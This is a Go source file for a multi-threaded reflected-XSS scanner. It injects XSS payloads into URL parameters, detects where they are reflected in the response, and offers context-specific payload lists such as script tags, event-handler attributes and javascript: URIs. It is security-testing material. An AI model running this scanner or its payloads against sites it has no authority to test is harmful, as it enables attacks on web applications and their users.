// Package scanner - GXSS Style Features
// GXSS (Golang XSS Scanner) is a fast reflected XSS scanner
// This file implements GXSS-style fast multi-parameter testing
package scanner

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
)

// GXSSConfig holds configuration for GXSS-style scanning
type GXSSConfig struct {
	Timeout      time.Duration
	ProxyURL     string
	Cookies      string
	Headers      map[string]string
	AuthHeader   string
	Threads      int
	Payloads     []string
	MatchRegex   string
	Verbose      bool
}

// DefaultGXSSConfig returns default GXSS configuration
func DefaultGXSSConfig() *GXSSConfig {
	return &GXSSConfig{
		Timeout:  10 * time.Second,
		Threads:  20,
		Payloads: getDefaultGXSSPayloads(),
		Verbose:  false,
	}
}

// GXSSResult represents a GXSS scan result
type GXSSResult struct {
	URL        string
	Parameter  string
	Payload    string
	Reflected  bool
	Context    string
	Evidence   string
}

// GXSSScanner implements GXSS-style fast scanning
type GXSSScanner struct {
	config *GXSSConfig
	client *http.Client
}

// NewGXSSScanner creates a new GXSS scanner
func NewGXSSScanner(config *GXSSConfig) *GXSSScanner {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    200,
		MaxConnsPerHost: 100,
		IdleConnTimeout: 90 * time.Second,
	}

	if config.ProxyURL != "" {
		proxyURL, err := url.Parse(config.ProxyURL)
		if err == nil {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}

	client := &http.Client{
		Timeout:   config.Timeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	return &GXSSScanner{
		config: config,
		client: client,
	}
}

// getDefaultGXSSPayloads returns default GXSS payloads
func getDefaultGXSSPayloads() []string {
	return []string{
		// Basic reflection test
		"gxss_test",
		// HTML context
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		// Attribute context
		"\" onerror=alert(1) ",
		"' onerror=alert(1) ",
		// JavaScript context
		"';alert(1);//",
		"\";alert(1);//",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
		// URL context
		"javascript:alert(1)",
		// Template context
		"{{7*7}}",
		"${7*7}",
		"<%= 7*7 %>",
	}
}

// ScanURL performs GXSS-style fast scanning on a URL
func (g *GXSSScanner) ScanURL(ctx context.Context, targetURL string) ([]GXSSResult, error) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return nil, fmt.Errorf("invalid URL: %w", err)
	}

	params := parsedURL.Query()
	if len(params) == 0 {
		return nil, fmt.Errorf("no parameters found in URL")
	}

	var results []GXSSResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Create job channel
	type job struct {
		param   string
		payload string
	}

	jobChan := make(chan job, len(params)*len(g.config.Payloads))

	// Start workers
	for i := 0; i < g.config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for j := range jobChan {
				select {
				case <-ctx.Done():
					return
				default:
				}

				result := g.testPayload(ctx, targetURL, j.param, j.payload)
				if result.Reflected {
					mu.Lock()
					results = append(results, result)
					mu.Unlock()

					if g.config.Verbose {
						color.Yellow("[GXSS] Reflected: %s = %s", j.param, j.payload)
					}
				}
			}
		}()
	}

	// Queue jobs
	for paramName := range params {
		for _, payload := range g.config.Payloads {
			jobChan <- job{param: paramName, payload: payload}
		}
	}
	close(jobChan)

	wg.Wait()

	return results, nil
}

// ScanMultipleURLs scans multiple URLs concurrently
func (g *GXSSScanner) ScanMultipleURLs(ctx context.Context, urls []string) (map[string][]GXSSResult, error) {
	results := make(map[string][]GXSSResult)
	var mu sync.Mutex
	var wg sync.WaitGroup

	// Create URL channel
	urlChan := make(chan string, len(urls))

	// Start workers
	for i := 0; i < g.config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for url := range urlChan {
				select {
				case <-ctx.Done():
					return
				default:
				}

				urlResults, err := g.ScanURL(ctx, url)
				if err == nil && len(urlResults) > 0 {
					mu.Lock()
					results[url] = urlResults
					mu.Unlock()
				}
			}
		}()
	}

	// Queue URLs
	for _, url := range urls {
		urlChan <- url
	}
	close(urlChan)

	wg.Wait()

	return results, nil
}

// testPayload tests a single payload
func (g *GXSSScanner) testPayload(ctx context.Context, targetURL, paramName, payload string) GXSSResult {
	result := GXSSResult{
		URL:       targetURL,
		Parameter: paramName,
		Payload:   payload,
	}

	// Build test URL
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return result
	}

	params := parsedURL.Query()
	params.Set(paramName, payload)
	parsedURL.RawQuery = params.Encode()
	testURL := parsedURL.String()

	// Make request with context
	req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
	if err != nil {
		return result
	}

	g.setHeaders(req)

	resp, err := g.client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024*1024))
	if err != nil {
		return result
	}

	bodyStr := string(body)

	// Check if payload is reflected
	if strings.Contains(bodyStr, payload) {
		result.Reflected = true
		result.Evidence = extractEvidence(bodyStr, payload)
		result.Context = g.detectContext(bodyStr, payload)
		
		// Dalfox-style output
		color.Red("[VULN] %s", payload)
		color.Red("       Param: %s", paramName)
		color.Red("       URL: %s", testURL)
		color.Red("       Context: %s", result.Context)
		fmt.Println()
	}

	return result
}

// setHeaders sets request headers
func (g *GXSSScanner) setHeaders(req *http.Request) {
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

	if g.config.Cookies != "" {
		req.Header.Set("Cookie", g.config.Cookies)
	}

	if g.config.AuthHeader != "" {
		req.Header.Set("Authorization", g.config.AuthHeader)
	}

	for key, value := range g.config.Headers {
		req.Header.Set(key, value)
	}
}

// detectContext determines the reflection context
func (g *GXSSScanner) detectContext(body, payload string) string {
	idx := strings.Index(body, payload)
	if idx == -1 {
		return "unknown"
	}

	// Get surrounding context
	start := idx - 50
	if start < 0 {
		start = 0
	}
	end := idx + len(payload) + 50
	if end > len(body) {
		end = len(body)
	}

	context := body[start:end]
	contextLower := strings.ToLower(context)

	// Check for script context
	if strings.Contains(contextLower, "<script") && !strings.Contains(contextLower, "</script>") {
		return "script"
	}

	// Check for attribute context
	if strings.Contains(context, "=\"") || strings.Contains(context, "='") {
		return "attribute"
	}

	// Check for HTML context
	if strings.Contains(contextLower, "<") && strings.Contains(contextLower, ">") {
		return "html"
	}

	// Check for URL context
	if strings.Contains(contextLower, "href=") || strings.Contains(contextLower, "src=") {
		return "url"
	}

	return "text"
}

// PrintGXSSResults prints GXSS results
func PrintGXSSResults(results []GXSSResult) {
	if len(results) == 0 {
		color.Yellow("[*] No reflected payloads found")
		return
	}

	color.Cyan("\n[*] GXSS Results: Found %d reflected payloads", len(results))

	// Group by parameter
	byParam := make(map[string][]GXSSResult)
	for _, r := range results {
		byParam[r.Parameter] = append(byParam[r.Parameter], r)
	}

	for param, paramResults := range byParam {
		color.Yellow("\n  Parameter: %s", param)
		for _, r := range paramResults {
			color.White("    Payload: %s", r.Payload)
			color.White("    Context: %s", r.Context)
		}
	}
}

// GetGXSSVulnerablePayloads returns payloads that are likely to work based on context
func GetGXSSVulnerablePayloads(context string) []string {
	switch context {
	case "script":
		return []string{
			"';alert(1);//",
			"\";alert(1);//",
			"'-alert(1)-'",
			"\"-alert(1)-\"",
			"</script><script>alert(1)</script>",
		}
	case "attribute":
		return []string{
			"\" onerror=alert(1) ",
			"' onerror=alert(1) ",
			"\" onload=alert(1) ",
			"' onload=alert(1) ",
			"\" autofocus onfocus=alert(1) ",
			"' autofocus onfocus=alert(1) ",
		}
	case "html":
		return []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"<body onload=alert(1)>",
			"<iframe src=javascript:alert(1)>",
		}
	case "url":
		return []string{
			"javascript:alert(1)",
			"javascript:alert(1)//",
			"data:text/html,<script>alert(1)</script>",
		}
	default:
		return []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
		}
	}
}
